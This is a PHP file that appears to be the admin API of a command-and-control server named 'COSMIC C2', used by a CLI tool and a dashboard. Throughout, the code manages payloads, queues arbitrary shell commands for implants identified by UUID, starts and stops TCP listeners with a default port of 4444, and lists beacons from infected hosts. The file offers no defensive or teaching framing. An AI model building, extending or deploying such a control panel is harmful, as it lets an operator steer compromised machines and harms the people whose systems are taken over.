<?php
/**
 * COSMIC C2 – RESTful Admin API
 * Used by CLI tool and AJAX dashboard.
 */
header('Content-Type: application/json');
require_once dirname(__DIR__, 3) . '/system/modules/C2Engine.php';

$c2 = new C2Engine();
$action = $_REQUEST['action'] ?? '';

$response = ['status' => 'error', 'message' => 'Invalid action'];

// Simple API key authentication (optional, for security)
$api_key = $_SERVER['HTTP_X_API_KEY'] ?? $_REQUEST['key'] ?? '';
if ($api_key !== getenv('C2_API_KEY')) {   // Change this in production
    http_response_code(401);
    die(json_encode(['status' => 'error', 'message' => 'Unauthorized']));
}

switch ($action) {
    // Payloads
    case 'list_payloads':
        $response = ['status' => 'ok', 'data' => $c2->getPayloads()];
        break;
    case 'delete_payload':
        $uuid = $_POST['uuid'] ?? $_GET['uuid'] ?? '';
        if ($uuid) {
            $c2->deletePayload($uuid);
            $response = ['status' => 'ok', 'message' => 'Payload deleted'];
        }
        break;
    case 'update_payload':
        $uuid = $_POST['uuid'] ?? '';
        $data = json_decode(file_get_contents('php://input'), true);
        if ($uuid && $data) {
            $c2->updatePayload($uuid, $data);
            $response = ['status' => 'ok', 'message' => 'Payload updated'];
        }
        break;
    
    // Tasks
    case 'add_task':
        $uuid = $_POST['uuid'] ?? $_GET['uuid'] ?? '';
        $cmd = $_POST['command'] ?? '';
        if ($uuid && $cmd) {
            $taskId = $c2->addTask($uuid, $cmd);
            $response = ['status' => 'ok', 'task_id' => $taskId];
        }
        break;
    case 'list_tasks':
        $uuid = $_GET['uuid'] ?? null;
        $response = ['status' => 'ok', 'data' => $c2->getTasks($uuid)];
        break;
    case 'delete_task':
        $id = $_POST['id'] ?? $_GET['id'] ?? 0;
        if ($id) {
            $c2->deleteTask($id);
            $response = ['status' => 'ok'];
        }
        break;
    
    // Listeners
    case 'list_listeners':
        $response = ['status' => 'ok', 'data' => $c2->getListeners()];
        break;
    case 'create_listener':
        $name = $_POST['name'] ?? '';
        $host = $_POST['lhost'] ?? '0.0.0.0';
        $port = $_POST['lport'] ?? 4444;
        $proto = $_POST['protocol'] ?? 'tcp';
        if ($name && $host && $port) {
            $id = $c2->createListener($name, $host, $port, $proto);
            $response = ['status' => 'ok', 'listener_id' => $id];
        }
        break;
    case 'start_listener':
        $id = $_POST['id'] ?? 0;
        if ($id) {
            $pid = $c2->startListener($id);
            $response = ['status' => 'ok', 'pid' => $pid];
        }
        break;
    case 'stop_listener':
        $id = $_POST['id'] ?? 0;
        if ($id) {
            $c2->stopListener($id);
            $response = ['status' => 'ok'];
        }
        break;
    case 'delete_listener':
        $id = $_POST['id'] ?? 0;
        if ($id) {
            $c2->deleteListener($id);
            $response = ['status' => 'ok'];
        }
        break;
    
    // Stats
    case 'stats':
        $response = ['status' => 'ok', 'data' => $c2->getStats()];
        break;
    
    // Beacons
    case 'beacons':
        $uuid = $_GET['uuid'] ?? null;
        $limit = $_GET['limit'] ?? 50;
        $response = ['status' => 'ok', 'data' => $c2->getBeacons($uuid, $limit)];
        break;
    
    default:
        $response['message'] = 'Unknown action';
}

echo json_encode($response, JSON_PRETTY_PRINT);
